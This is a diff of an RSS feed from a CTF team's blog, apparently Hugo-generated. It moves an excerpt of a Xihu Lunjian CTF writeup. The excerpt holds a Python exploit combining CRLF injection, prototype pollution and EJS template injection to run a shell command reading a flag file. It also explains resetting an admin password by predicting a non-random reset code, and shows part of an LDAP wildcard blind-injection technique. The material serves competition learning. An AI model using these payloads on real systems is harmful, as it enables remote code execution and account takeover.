@@ -6,18 +6,7 @@
     <description>Recent content in Web on or4nge</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 07 Nov 2022 19:00:00 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>西湖论剑 Writeup by or4nge</title>
-      <link>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</link>
-      <pubDate>Mon, 07 Nov 2022 19:00:00 +0800</pubDate>
-      
-      <guid>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</guid>
-      <description>Web 扭转乾坤 apache层面的waf说content-type不能是multipart/form-data,结合题目描述利用tomcat和apache对content-type理解差异性大小写绕过后随意上传文件即可获取flag。 real_ez_node CRLF注入+原型链污染+ejs模板注入
-import requests import urllib url = &amp;#34;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&amp;#34; payload = &amp;#39;&amp;#39;&amp;#39; HTTP/1.1 POST /copy HTTP/1.1 Host: 127.0.0.1 Content-Length: 159 Content-Type: application/json {&amp;#34;constructor.prototype.outputFunctionName&amp;#34;:&amp;#34;__tmp1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /flag.txt&amp;#39;);var __tmp2&amp;#34;} GET / HTTP/1.1 test:&amp;#39;&amp;#39;&amp;#39;.replace(&amp;#39;\n&amp;#39;,&amp;#39;\r\n&amp;#39;) def payload_encode(raw): ret = u&amp;#34;&amp;#34; for i in raw: ret += chr(0x0100+ord(i)) return ret payload = payload_encode(payload) print(payload) r = requests.get(url + &amp;#34;curl?q=&amp;#34; + urllib.parse.quote(payload)) print(r.text) 访问首页即可下载flag文件。 real world git 忘记密码的逻辑中，生成的验证码只跟邮箱和时间戳有关系，没有引入随机数，本地跑一下就能跑出来，然后利用这个验证码重置root@codefever.cn的密码，再登录就可以看到flag了。
-&amp;lt;?php // this function use to generated uuid namespace service\Utility; define(&amp;#39;TOTP_SALT&amp;#39;, &amp;#39;codefever-salt&amp;#39;); class TOTP { const SALT = &amp;#39;codefever_salt&amp;#39;; const TOTP_REFRESH_INTERVAL = 30; const TOTP_CHECK_WINDOW_MIN = -10; const TOTP_CHECK_WINDOW_MAX = 10; const PASSWORD_LENGTH = 6; static private function hashInput (string $input) { $salt = self::SALT; if (TOTP_SALT) { $salt = TOTP_SALT; } $input = $input ?</description>
-    </item>
-    
+    <lastBuildDate>Wed, 31 Aug 2022 11:45:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>2022网鼎杯初赛 Writeup by or4nge</title>
       <link>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</link>
@@ -81,6 +70,17 @@ The flag is a special email address username.It is attribute of one account and 
 按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
 Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
 import requests url = &amp;#34;http://47.</description>
+    </item>
+    
+    <item>
+      <title>西湖论剑 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/</guid>
+      <description>Web 扭转乾坤 apache层面的waf说content-type不能是multipart/form-data,结合题目描述利用tomcat和apache对content-type理解差异性大小写绕过后随意上传文件即可获取flag。 real_ez_node CRLF注入+原型链污染+ejs模板注入
+import requests import urllib url = &amp;#34;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&amp;#34; payload = &amp;#39;&amp;#39;&amp;#39; HTTP/1.1 POST /copy HTTP/1.1 Host: 127.0.0.1 Content-Length: 159 Content-Type: application/json {&amp;#34;constructor.prototype.outputFunctionName&amp;#34;:&amp;#34;__tmp1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /flag.txt&amp;#39;);var __tmp2&amp;#34;} GET / HTTP/1.1 test:&amp;#39;&amp;#39;&amp;#39;.replace(&amp;#39;\n&amp;#39;,&amp;#39;\r\n&amp;#39;) def payload_encode(raw): ret = u&amp;#34;&amp;#34; for i in raw: ret += chr(0x0100+ord(i)) return ret payload = payload_encode(payload) print(payload) r = requests.get(url + &amp;#34;curl?q=&amp;#34; + urllib.parse.quote(payload)) print(r.text) 访问首页即可下载flag文件。 real world git 忘记密码的逻辑中，生成的验证码只跟邮箱和时间戳有关系，没有引入随机数，本地跑一下就能跑出来，然后利用这个验证码重置root@codefever.cn的密码，再登录就可以看到flag了。
+&amp;lt;?php // this function use to generated uuid namespace service\Utility; define(&amp;#39;TOTP_SALT&amp;#39;, &amp;#39;codefever-salt&amp;#39;); class TOTP { const SALT = &amp;#39;codefever_salt&amp;#39;; const TOTP_REFRESH_INTERVAL = 30; const TOTP_CHECK_WINDOW_MIN = -10; const TOTP_CHECK_WINDOW_MAX = 10; const PASSWORD_LENGTH = 6; static private function hashInput (string $input) { $salt = self::SALT; if (TOTP_SALT) { $salt = TOTP_SALT; } $input = $input ?</description>
     </item>
     
   </channel>
